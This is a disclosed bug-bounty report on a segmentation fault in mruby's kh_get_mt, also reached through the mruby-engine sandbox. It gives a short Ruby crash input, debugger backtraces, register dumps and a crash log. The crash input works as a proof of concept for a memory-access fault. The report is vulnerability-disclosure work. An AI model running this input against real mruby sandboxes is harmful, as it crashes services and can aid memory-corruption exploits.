# Segmentation fault due to bad memory access in kh_get_mt

## Report Details
- **Report ID**: 188313
- **URL**: https://hackerone.com/reports/188313
- **State**: Closed
- **Severity**: high
- **Submitted**: 2016-12-05T02:03:56.063Z
- **Disclosed**: 2016-12-17T20:07:37.420Z

## Reporter
- **Username**: haquaman
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
Crash file is:

```
values=[0,0,0,0]
unused_but_needed=[]
Hash=[]
values.each do
  values.each do
    values & values.each do
      values.each do
        %  [0]=nil
      end
    end
  end
end
```

```
 $ ./dev/bin/mruby crash.rb
Segmentation fault: 11

```

```
$ lldb ./dev/bin/mruby crash.rb
(lldb) target create "./dev/bin/mruby"
Current executable set to './dev/bin/mruby' (x86_64).
(lldb) settings set -- target.run-args  "crash.rb"
(lldb) r
Process 27834 launched: './dev/bin/mruby' (x86_64)
Process 27834 stopped
* thread #1: tid = 0x879ccd0, 0x0000000100006cb6 mruby`kh_get_mt + 38, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x80)
    frame #0: 0x0000000100006cb6 mruby`kh_get_mt + 38
mruby`kh_get_mt:
->  0x100006cb6 <+38>: movl   (%rsi), %eax
    0x100006cb8 <+40>: subl   $0x1, %eax
    0x100006cbb <+43>: andl   %eax, %edx
    0x100006cbd <+45>: movl   %edx, -0x20(%rbp)
(lldb) bt
* thread #1: tid = 0x879ccd0, 0x0000000100006cb6 mruby`kh_get_mt + 38, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x80)
  * frame #0: 0x0000000100006cb6 mruby`kh_get_mt + 38
    frame #1: 0x000000010000ba80 mruby`mrb_method_search_vm + 80
    frame #2: 0x000000010003f8b9 mruby`mrb_vm_exec + 5881
    frame #3: 0x000000010003e1a7 mruby`mrb_vm_run + 135
    frame #4: 0x0000000100046604 mruby`mrb_top_run + 100
    frame #5: 0x0000000100071adf mruby`load_exec + 1183
    frame #6: 0x0000000100071623 mruby`mrb_load_file_cxt + 67
    frame #7: 0x00000001000017d8 mruby`main + 904
    frame #8: 0x00007fff8a9db5ad libdyld.dylib`start + 1
(lldb) register read
General Purpose Registers:
       rax = 0x0000000000000025
       rbx = 0x0000000000000000
       rcx = 0x00000001002028a0
       rdx = 0x00000000000002eb
       rdi = 0x00000001002029f0
       rsi = 0x0000000000000080
       rbp = 0x00007fff5fbfc9f0
       rsp = 0x00007fff5fbfc9f0
        r8 = 0x00000001002029ff
        r9 = 0x00007fff5fbfc9b0
       r10 = 0xf100d311ef8d6921
       r11 = 0x0000000000000001
       r12 = 0x0000000000000000
       r13 = 0x0000000000000000
       r14 = 0x0000000000000000
       r15 = 0x0000000000000000
       rip = 0x0000000100006cb6  mruby`kh_get_mt + 38
    rflags = 0x0000000000010206
        cs = 0x000000000000002b
        fs = 0x0000000000000000
        gs = 0x0000000000000000

(lldb) q
Quitting LLDB will kill one or more processes. Do you really want to proceed: [Y/n] y

```

Another lldb run with symbols to see what class is in the `mrb_method_search_vm`

```
$ lldb ./mruby/bin/mruby crash.rb
(lldb) target create "./mruby/bin/mruby"
Current executable set to './mruby/bin/mruby' (x86_64).
(lldb) settings set -- target.run-args  "crash.rb"
(lldb) r
Process 95246 launched: './mruby/bin/mruby' (x86_64)
nt = 3
nt = 17
nt = 24
nt = 35
nt = 51
nt = 51
nt = 51
nt = 51
nt = 24
nt = 35
nt = 24
nt = 35
nt = 29
nt = 40
nt = 4
nt = 17
nt = 29
nt = 40
nt = 4
nt = 17
nt = 29
nt = 40
nt = 29
nt = 40
nt = 4
nt = 17
nt = 29
nt = 40
nt = 4
nt = 17
nt = 24
nt = 87
nt = 56
nt = 51
in gen_send
in gen_send
in gen_send
in gen_send
in gen_send
in gen_send
Process 95246 stopped
* thread #1: tid = 0x87adab7, 0x0000000100006436 mruby`kh_get_mt(mrb=0x0000000100202c80, h=0x0000000000000080, key=150) + 38 at class.c:19, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x80)
    frame #0: 0x0000000100006436 mruby`kh_get_mt(mrb=0x0000000100202c80, h=0x0000000000000080, key=150) + 38 at class.c:19
   16   #include <mruby/data.h>
   17   #include <mruby/istruct.h>
   18
-> 19   KHASH_DEFINE(mt, mrb_sym, struct RProc*, TRUE, kh_int_hash_func, kh_int_hash_equal)
   20
   21   void
   22   mrb_gc_mark_mt(mrb_state *mrb, struct RClass *c)
(lldb) up
frame #1: 0x000000010000b200 mruby`mrb_method_search_vm(mrb=0x0000000100202c80, cp=0x00007fff5fbfd478, mid=150) + 80 at class.c:1225
   1222     khash_t(mt) *h = c->mt;
   1223
   1224     if (h) {
-> 1225       k = kh_get(mt, mrb, h, mid);
   1226       if (k != kh_end(h)) {
   1227         m = kh_value(h, k);
   1228         if (!m) break;
(lldb) up
frame #2: 0x000000010003f039 mruby`mrb_vm_exec(mrb=0x0000000100202c80, proc=0x0000000100805810, pc=0x0000000100091124) + 5881 at vm.c:1116
   1113         }
   1114       }
   1115       c = mrb_class(mrb, recv);
-> 1116       m = mrb_method_search_vm(mrb, &c, mid);
   1117       if (!m) {
   1118         mrb_value sym = mrb_symbol_value(mid);
   1119         mrb_sym missing = mrb_intern_lit(mrb, "method_missing");
(lldb) p *c
(RClass) $0 = {
  tt = MRB_TT_STRING
  color = 2
  flags = 0
  c = 0x000000010080ccb0
  gcnext = 0x0000000000000000
  iv = 0x0000000000000000
  mt = 0x0000000000000080
  super = 0x0000000100700470
}
(lldb) q
Quitting LLDB will kill one or more processes. Do you really want to proceed: [Y/n] y

```

Also affects `mruby-engine`.

```
./bin/sandbox:20: [BUG] Segmentation fault at 0x00000000000080
ruby 2.3.0p0 (2015-12-25 revision 53290) [x86_64-darwin15]

-- Crash Report log information --------------------------------------------
   See Crash Report log file under the one of following:
     * ~/Library/Logs/CrashReporter
     * /Library/Logs/CrashReporter
     * ~/Library/Logs/DiagnosticReports
     * /Library/Logs/DiagnosticReports
   for more details.
Don't forget to include the above Crash Report log file in bug reports.

-- Control frame information -----------------------------------------------
c:0003 p:---- s:0011 e:000010 CFUNC  :sandbox_eval
c:0002 p:0214 s:0006 E:0001f0 EVAL   ./bin/sandbox:20 [FINISH]
c:0001 p:0000 s:0002 E:000570 (none) [FINISH]

-- Ruby level backtrace information ----------------------------------------
./bin/sandbox:20:in `<main>'
./bin/sandbox:20:in `sandbox_eval'

-- Machine register context ------------------------------------------------
 rax: 0x00000000000002eb rbx: 0x0000000107c48af8 rcx: 0x0000000000000000
 rdx: 0x0000000000000096 rdi: 0x0000000107c36440 rsi: 0x00007fff58a19190
 rbp: 0x00007fff58a18f50 rsp: 0x00007fff58a18f28  r8: 0x0000000000000001
  r9: 0x0000000107bb9104 r10: 0x0000000107bb9100 r11: 0x0000000107c48b00
 r12: 0x0000000000000096 r13: 0x0000000000000096 r14: 0x0000000000000080
 r15: 0x0000000107c3fc20 rip: 0x0000000107b198e9 rfl: 0x0000000000010202

-- C level backtrace information -------------------------------------------
0   ruby                                0x00000001073835d4 rb_vm_bugreport + 388
1   ruby                                0x0000000107225023 rb_bug_context + 483
2   ruby                                0x00000001072f8653 sigsegv + 83
3   libsystem_platform.dylib            0x00007fff9826d52a _sigtramp + 26
4   mruby_engine.bundle                 0x0000000107b198e9 mrb_method_search_vm + 89
5   ???                                 0x0000000107c48af8 0x0 + 4425288440

-- Other runtime information -----------------------------------------------

* Loaded script: ./bin/sandbox

* Loaded features:

    0 enumerator.so
    1 thread.rb
    2 rational.so
    3 complex.so
<snip various gems>
  185 /Users/<snip>/mruby-engine/lib/mruby_engine/mruby_engine.bundle
  186 /Users/<snip>/mruby-engine/lib/mruby_engine.rb

[NOTE]
You may have encountered a bug in the Ruby interpreter or extension libraries.
Bug reports are welcome.
For details: http://www.ruby-lang.org/bugreport.html

```

I haven't worked out the ideal place for a patch yet.

Cheers,

Hugh

## Attachments
No attachments
